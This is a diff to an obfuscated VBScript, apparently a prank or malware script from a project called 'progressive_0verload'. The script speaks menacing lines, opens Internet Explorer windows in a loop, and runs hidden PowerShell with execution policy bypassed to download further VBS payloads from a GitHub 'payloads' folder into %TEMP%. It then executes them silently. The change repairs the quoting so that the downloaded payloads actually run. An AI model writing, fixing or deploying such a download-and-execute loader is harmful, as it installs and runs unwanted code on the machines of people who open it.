@@ -62,7 +62,7 @@ Select Case LCase(Trim(p3j5w))
         path = w7k3p.ExpandEnvironmentStrings("%TEMP%") & "\fun.vbs"
         x3zg5 = "powershell.exe -ep bypass -w hidden -noP ""iwr -Uri 'https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/fun.vbs' -OutFile '" & path & "'"""
         w7k3p.Run x3zg5, 0, True
-        w7k3p.Run "wscript.exe '" & path & "'", 0, False
+        w7k3p.Run "wscript.exe """ & path & """", 0, False
 
     Case Else
         x9q2v.Speak "Wrong. Your neurons ignite. Sensory annihilation begins"
@@ -76,7 +76,7 @@ Select Case LCase(Trim(p3j5w))
         pathf = w7k3p.ExpandEnvironmentStrings("%TEMP%") & "\final.vbs"
         x4zg6 = "powershell.exe -ep bypass -w hidden -noP ""iwr -Uri 'https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fun/fun_final.vbs' -OutFile '" & pathf & "'"""
         w7k3p.Run x4zg6, 0, True
-        w7k3p.Run "wscript.exe '" & pathf & "'", 0, False 
+        w7k3p.Run "wscript.exe """ & pathf & """", 0, False 
         For i = 1 To 8
             On Error Resume Next
             Set ie = CreateObject("InternetExplorer.Application")
